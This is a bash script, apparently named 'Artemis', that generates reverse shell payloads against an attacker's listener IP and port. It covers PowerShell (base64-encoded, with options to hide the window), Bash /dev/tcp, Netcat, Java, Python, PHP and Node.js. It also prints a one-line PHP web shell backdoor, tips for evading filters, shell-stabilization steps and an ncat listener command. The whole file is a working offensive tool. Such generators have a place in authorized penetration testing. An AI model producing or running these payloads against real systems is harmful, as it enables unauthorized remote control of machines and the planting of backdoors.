#!/bin/bash

#To-DO: Add Ruby & Perl payloads
line="============================================================"
listen="false"

Help()
{
  cat <<EOF
Artemis will run in interactive mode unless required arguments are supplied.

[Options]
	-h: Display this help menu
	-i <IP_ADDRESS>: Your listener's IP Address
	-p <PORT>: Your listener's port
	-l: Start a listener using specified interface and port
	-t <TARGET_OS>: Specify the target OS for Web shell payloads & for stabilization tips
	-s <PAYLOAD>: Specify the type of Reverse shell to generate

[Payloads]
	ps: PowerShell
	bash
	nc: Netcat [nix]
	java
	py: Python [nix]
	php: [nix]
	node: Node.js [nix]

[Target OS]
	win: Windows
	nix: Linux & other Unix-like operating systems

[Usage]
	artemis -i 10.10.144.68 -p 443 -s php -t nix -l

[Troubleshooting]
	If you're having trouble catching a shell, try the following steps-

	1) Double check your firewall settings & verify target's IP Address
	2) Instead of using a Reverse shell payload, start capturing ICMP packets and use a payload to make the target ping you a few times
	3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using

EOF
exit 0
}

PowerSHELL()
{
  text="\$Text = '\$client = New-Object System.Net.Sockets.TCPClient(\"$host\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'"

  ops='$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText'

  payload=$(echo -n "$text;$ops" | pwsh -Command - | tr -d '\n')
}

while getopts "hi:p:ls:t:" option; do
  case $option in
    h)
      Help
      ;;
    i)
      host="$OPTARG"
      ;;
    p)
      port="$OPTARG"
      ;;
    l)
      listen="true"
      ;;
    s)
      shell="$OPTARG"
      ;;
    t)
      target="$OPTARG"
      ;;
  esac
done

if [[ -z "$host" ]]; then
  echo -e "\nThe following interfaces have been detected\n"
  ip -c a
  echo -e "\nEnter your IP Address: "
  read host
fi

if [[ -z "$port" ]]; then
  echo "Enter the Listener's port number"
  read port
fi

if [[ -z "$shell" ]]; then
  cat <<EOF
Select an operation:
	[1] PowerShell
	[2] Bash
	[3] Netcat
	[4] Java
	[5] Python
	[6] PHP
	[7] Node.js
EOF
  read shell
fi

if [[ -z "$target" ]]; then
  while :; do
    cat <<EOF

Select your target's OS:
	[1] Linux Target
	[2] Windows Target
EOF
    read target
    if [[ "$target" == "1" ]]; then
      target="nix"
      break
    elif [[ "$target" == "2" ]]; then
      target="win"
      break
    else
      echo -e "\n[Invalid selection]\nEnter either 1 or 2 for Linux or Windows\n"
    fi
  done
fi

case "$shell" in
  ps|1)
    PowerSHELL
    
    cat <<EOF
$line

[PowerShell | $host:$port] 

The basic payload is more reliable, but it may not run as a 64-bit process depending on the context that the payload is executed in

You can try to force the target to run Powershell (x64) using the x64 Syntax

[+] Additional Arguments: Optionally add other parameters like '-NoP' (NoProfile) & '-W Hidden' (Hide terminal on the target machine)

$line

{Basic Payload}

powershell -enc $payload

$line

{x64 Payload}

C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -enc $payload

EOF
    ;;
  bash|2)
    basic="bash -i >& /dev/tcp/$host/$port 0>&1"
    b64=$(echo -n "$basic" | base64)

    cat <<EOF
$line

[Bash | $host:$port]

URL-Encoding the basic payload can break it. Try the B64 payload if you need to URL-Encode it, or bypass filters

$line

{Basic Payload}

$basic

$line

{B64 Payload}

echo $b64|base64 -d|bash

EOF
    ;;
  nc|3)
    cat <<EOF
$line

[Netcat | $host:$port]

Named Pipe Payload is more stable. Alternate Payload only works for certain versions of Netcat

$line

{Named Pipe Payload}

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f

$line

{Alternate Payload}

nc -e /bin/sh $host $port

EOF
    ;;
  java|4)
    if [[ "$target" == "nix" ]]; then
      cat <<EOF
$line

[Java | Linux | $host:$port]

r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/$host/$port; cat <&5 | while read value; do \\\$value 2>&5 >&5; done"] as String[])
p.waitFor()

EOF
    elif [[ "$target" == "win" ]]; then
      PowerSHELL
      cat <<EOF
$line

[Java | Windows | $host:$port]

r = Runtime.getRuntime()
p = r.exec(["powershell.exe", "-enc", "$payload"] as String[])
p.waitFor()

EOF
    fi
    ;;
  py|5)
    cat <<EOF
$line

[Python | Linux | $host:$port]

You may need to substitute 'python3' for 'python' or 'python2'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

EOF
    ;;
  php|6)
    echo -e "\n$line\n"
    cat <<'EOF'
[PHP | Generic Backdoor]

This is the smallest possible payload, & it should work on any PHP server.

If you're adding the payload to an existing file, append the PHP closing tags ?>

Navigate to the file's URL to execute commands (e.g. https://example.com/shell.php?0=whoami)

{Tiny Payload}

<?=`$_GET[0]`
EOF
    cat <<EOF
$line

[PHP | Linux | $host:$port]\n\n"

[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target)

{CLI Payload}

php -r '\$sock=fsockopen("$host",$port);exec("/bin/sh -i <&3 >&3 2>&3");'

$line

{Tag Payload}

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'");?>

EOF
    ;;

  node|7)
    cat <<EOF
$line

[Node.js | Linux | $host:$port]

require('child_process').exec('bash -i >& /dev/tcp/$host/$port 0>&1');

EOF
    ;;

  *)
    echo -e "\nYou did not select a valid option\n"
    Help
    ;;
esac
echo -e "$line"

case "$target" in
  nix)
    cat <<EOF

[Stabilize Linux shell]

[!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell

	1) Identify SW on target:
	  which python python2 python3 ruby perl lua

	2) Example Commands:
	  python3 -c 'import pty;pty.spawn("/bin/bash")'
	  perl -e 'exec "/bin/sh";'
	  ruby -e 'exec "/bin/sh"'
	  lua -e "os.execute('/bin/sh')"

	3) Set Shell Type:
	  export SHELL=bash

	4) Set Terminal Type:
	  export TERM=xterm-256color
EOF
#	5) {Optional} Configure Attacker's Terminal:
#	  A) Background Reverse Shell:
#	    Press CTRL+Z
#	  B) Disable Attacker's Echo:
#	    stty raw -echo
#	  C) Get Size of Terminal Window: This changes if you resize the terminal!
#	    stty size
#	  D) Foreground Reverse Shell: Press "Enter" a couple times afterwards
#	    fg
#	  E) Set Reverse Shell Terminal Size: Replace X & Y with the numbers from Step C
#	    stty rows X columns Y
    ;;
  win)
    cat <<'EOF'

[Stabilize Windows shell]

Use this shell to create a "Backup Shell" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.

{Setup}
	1) Navigate to a Writable Directory:
	  cd \users\public

	2) Create a file with your payload [May be bad advice. These may want an EXE, like the Process command]:
	  Write-Output "PAYLOAD" > shell.ps1

{Methods}
	1) Process: (Try with and without "-NoNewWindow")
	  Start-Process -FilePath "powershell" -ArgumentList "-enc ENCODED"

	2) Job:
	  Start-Job .\shell.ps1

	3) Run in foreground:
	  C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1

EOF
    ;;
  *)
    echo -e "\nYou did not select a valid option\n"
    ;;
esac

echo -e "\n$line\n"

if [[ "$listen" == "true" ]]; then
  rlwrap ncat -lvnp "$port"
fi
